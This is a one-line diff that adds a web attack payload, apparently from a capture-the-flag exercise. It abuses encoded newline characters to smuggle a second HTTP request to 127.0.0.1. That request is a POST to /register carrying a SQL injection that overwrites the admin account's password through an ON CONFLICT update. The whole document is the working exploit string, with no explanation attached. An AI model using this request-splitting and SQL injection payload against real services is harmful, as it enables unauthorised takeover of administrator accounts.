@@ -1,0 +1,1 @@
+endpoint=127.0.0.1:80&city=ĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊConnection:Ġkeep-aliveĊĊĊPOSTĠ/registerĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊContent-Type:Ġapplication/x-www-form-urlencodedĊUser-Agent:ĠMozilla/5.0ĊConnection:Ġkeep-aliveĊContent-Length:Ġ107ĊĊusername=adminĦpassword=admin%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27admin%27%20--ĊĊGETĠ/?&country=register
